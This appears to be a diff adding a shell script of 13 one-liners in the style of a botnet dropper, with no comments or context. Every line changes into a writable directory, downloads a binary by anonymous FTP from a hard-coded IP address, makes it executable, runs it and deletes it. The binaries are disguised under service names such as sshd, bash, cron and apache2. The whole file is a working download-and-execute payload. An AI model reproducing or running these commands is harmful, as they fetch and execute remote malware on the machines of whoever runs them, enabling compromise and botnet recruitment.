@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupesntpd dupesntpd; chmod 777 dupesntpd ./dupesntpd; rm -rf dupesntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupessshd dupessshd; chmod 777 dupessshd ./dupessshd; rm -rf dupessshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupesopenssh dupesopenssh; chmod 777 dupesopenssh ./dupesopenssh; rm -rf dupesopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupesbash dupesbash; chmod 777 dupesbash ./dupesbash; rm -rf dupesbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupestftp dupestftp; chmod 777 dupestftp ./dupestftp; rm -rf dupestftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupeswget dupeswget; chmod 777 dupeswget ./dupeswget; rm -rf dupeswget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupescron dupescron; chmod 777 dupescron ./dupescron; rm -rf dupescron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupesftp dupesftp; chmod 777 dupesftp ./dupesftp; rm -rf dupesftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupespftp dupespftp; chmod 777 dupespftp ./dupespftp; rm -rf dupespftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 dupessh dupessh; chmod 777 dupessh ./dupessh; rm -rf dupessh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 ' ' ' '; chmod 777 ' ' ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 apache2 apache2; chmod 777 apache2 ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 188.213.161.46 telnetd telnetd; chmod 777 telnetd ./telnetd; rm -rf telnetd
